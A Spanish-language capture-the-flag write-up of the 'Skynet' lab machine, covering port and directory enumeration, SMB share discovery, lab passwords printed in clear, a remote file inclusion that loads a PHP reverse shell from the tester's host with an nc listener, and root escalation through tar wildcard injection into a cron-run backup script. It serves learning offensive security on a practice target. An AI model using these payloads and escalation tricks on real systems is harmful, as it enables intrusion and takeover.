---
Titulo: Skynet
Fecha: 31-10-2025
categoria:
  - Crontab
  - LFI
  - tar
Dificultad_oficial: Fácil
Dificultad_percibida: Facil/Medio
Estado: Terminado
---
## 1. Descripción del reto
Este reto parece que va a ser un user to root, en el cual la idea principal será 
 utilizar un vector web y de ahí explotar y enumerar hasta conseguir información, esto pueden ser contraseñas, directorios, archivos, etc...
## 2. Enumeración / Reconocimiento
```shell
root@ip-10-10-87-114:~# nmap -sS -Pn -sV --min-rate 5000 --open 10.10.197.31
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-31 12:15 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.197.31
Host is up (0.0011s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:60:80:88:04:D9 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```

Bueno, primer escaneo de esta máquina, vemos que tiene bastantes puertos abiertos (Cosa que no es común).  Los puertos que más me llaman la atención de momento son 3, el HTTP (Ya que parece que será la vulnerabilidad principal) y los dos de samba (139 y 445). 
De momento voy a ir realizando un escaneo con *gobuster* con la triada clásica de extensiones (html, php y txt) a la pagina web haber si encuentro algún directorio o archivo oculto que nos pueda ser de utilidad, en caso de que me encuentre con un 'rabit hole' voy a enumerar la versión de samba para verificar si es vulnerable o no.  

```shell
root@ip-10-10-87-114:~# gobuster dir -u http://10.10.197.31 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.197.31
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 523]
/admin                (Status: 301) [Size: 312] [--> http://10.10.197.31/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.197.31/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.197.31/js/]
/config               (Status: 301) [Size: 313] [--> http://10.10.197.31/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.197.31/ai/]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.197.31/squirrelmail/]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vale, como pensaba van a haber algunos directorios interesantes como pueden ser `admin`, `ai`, `config` y `squirrelmail`. Ahora me toca si o si entrar y revisar las paginas en buscar de vulnerabilidades. Primero analizare la pagina principal y después me iré yendo por las comentadas.

![[Pasted image 20251031123029.png]]

Vale, algo novedoso, me esperaba cualquier cosa menos un buscador.

```html
<form name="skynet" action="#" method="POST"><br>
				<input type="search" class="search"><br>
				<input type="submit" class="button" name="submit" value="Skynet Search">
				<input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
			</form>
```

Y entre el código, me quedo con esta parte, ya que como se ve esta con el método `POST` y puede que internamente al buscar algo en específico me devuelva un valor diferente al esperado, que pueda inyectar contenido externo ó inclusive ¿hacer una reverse shell de alguna forma?. Bueno me dejo de soñar y empiezo a descartar cosas primero que nada voy a analizar la petición HTTP haber si encuentro algo interesante. 

![[Pasted image 20251031130131.png]]

Vale, no encontré nada ni en la petición HTTP ni en los otros directorios mencionados, el único que me ha dado un 200 ok a sido el directorio `squirrelmail`, voy a ver si la versión es vulnerable a algo en específico.

Vale es vulnerable a un par de cosas (Buscado con metasploit y searchsploit), pero todavía no puedo explotarlo ya que necesito más información que no tengo, por lo que me pondré a analizar esos samba.

```shell
-----------------------------------------------------------------------------
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.10.197.31:445      - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{6e796b73-7465-0000-0000-000000000000}) (authentication domain:SKYNET)
[+] 10.10.197.31:445      -   Host is running Version 6.1.0 (unknown OS)
[*] 10.10.197.31          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
-----------------------------------------------------------------------------
msf6 auxiliary(scanner/smb/smb_enumusers) > run
[*] 10.10.197.31:445 - Using automatically identified domain: SKYNET
[+] 10.10.197.31:445 - SKYNET [ milesdyson ] ( LockoutTries=0 PasswordMin=5 )
[+] 10.10.197.31:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
[*] 10.10.197.31: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
-----------------------------------------------------------------------------
msf6 auxiliary(scanner/smb/smb_enumshares) > run
[+] 10.10.197.31:139 - print$ - (DISK) Printer Drivers
[+] 10.10.197.31:139 - anonymous - (DISK) Skynet Anonymous Share
[+] 10.10.197.31:139 - milesdyson - (DISK) Miles Dyson Personal Share
[+] 10.10.197.31:139 - IPC$ - (IPC|SPECIAL) IPC Service (skynet server (Samba, Ubuntu))
[*] 10.10.197.31: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
-----------------------------------------------------------------------------
```

## 3. Explotación / Desarrollo
Vale revisando lo que tengo veo que en el último tengo un usuario "anonymous" voy a ver que consigo de el.

![[Drawing 2025-10-31 13.55.10.excalidraw]]

JAJAJA, ahora fuera de bromas a sido todo un éxito, ahora voy a hacer fuerza bruta al formulario de "squirrelmail" con el usuario y contraseñas que encontré. (Es cyborg007haloterminator)

En un correo me encontré la contraseña del nuevo usuario de smb: ")s{A&2Z=F^n_E.B`"

Dentro de este usuario encontré lo siguiente:
```shell
root@ip-10-10-96-250:~# smbclient //10.10.130.43/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
smb: \> ls
[...]
  notes                               D        0  Tue Sep 17 10:18:40 2019
[...]
smb: \> cd notes
smb: \notes\> ls
[...]
1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:]29 2019
important.txt                       N      117  Tue Sep 17 10:18:39 2019
6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
[...]
```

y después lo descargue y visualice:

```shell
root@ip-10-10-96-250:~# smbget -R smb://10.10.130.43/milesdyson -U milesdyson
Password for [milesdyson] connecting to //10.10.130.43/milesdyson: 
Using workgroup WORKGROUP, user milesdyson
root@ip-10-10-96-250:~# cat notes/important.txt 
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Y premio tengo el directorio que tanto buscaba
## 4. Post‑explotación (si aplica)
Ahora que ya la maquina esta casi completamente comprometida, falta conseguir un shell y escalar privilegios.

![[Pasted image 20251031172644.png]]

Una vez he entrado en esta página me aparece este formulario de inicio de sesión.

Buscando, encontré que con "/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd" despues de "http://10.10.130.43/45kra24zxs28v3yd/administrator/" podía ejecutar cualquier comando, por lo que me genere una reverse shell de php y la cole con el siguiente LFI: 

```http
10.10.130.43/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.96.250:8000/shell.php
```

y poniendo una escucha con:

```shell
nc -lvnp 8080
```

y así obtuve:

```shell
root@ip-10-10-96-250:~# nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 10.10.130.43 42426
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:35:31 up  1:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1193): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ whoami
whoami
www-data
```

Después he lanzado `linpeas` y encontré que en crontab se ejecuta "/home/milesdyson/backups/backup.sh" y este a su vez contenia:
```text
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Por lo que haciendo una búsqueda medianamente rápida encontré que  con:

```shell
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"  
touch "/var/www/html/--checkpoint=1"
```

>[!info] 
>- `*` se expande por el shell a todos los nombres en `/var/www/html`. Entre ellos pusiste dos archivos cuyo nombre empieza por `--`.
>- GNU `tar` acepta opciones en cualquier posición de la línea de argumentos. Cuando ve algo que empieza por `--` lo trata como **opción**, no como fichero.
>- Las opciones `--checkpoint=1` y `--checkpoint-action=exec=sh root_shell.sh` le dicen a `tar` que, en el primer punto de control, ejecute `sh root_shell.sh`.
>- El cronjob ejecuta ese `tar` como **root**. Por tanto `sh root_shell.sh` se ejecuta con privilegios de root. Ese script hace `chmod +s /bin/bash`, que pone el bit SUID en `/bin/bash`.
>- Con SUID en `/bin/bash` cualquier usuario que ejecute `/bin/bash` obtiene privilegios de root. Resultado: escalada de privilegios.


Después de 1 minuto deberíamos de poder ejecutar:
```shell
/bin/bash -p
bash-4.3# whoami
whoami
root
```
## 5. Notas y aprendizajes

- Punto fuerte: Aprendes de todo un poco y como funcionan LFI y como escalar privilegios atreves de trabajos crontab
    
- Dificultad encontrada: Saber como usar crontab a mi favor
    
- Conceptos nuevos aprendidos: Crontab, tar, LFI